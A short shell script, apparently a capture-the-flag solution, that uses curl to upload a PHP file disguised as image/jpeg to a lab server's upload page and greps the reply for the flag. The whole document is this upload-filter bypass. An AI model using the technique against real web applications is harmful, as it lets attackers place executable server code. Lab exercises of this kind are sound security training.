#!/bin/sh
curl -X POST -F 'Upload=Upload' -F 'uploaded=@empty.php;type=image/jpeg' "192.168.101.204/?page=upload#" | grep "flag"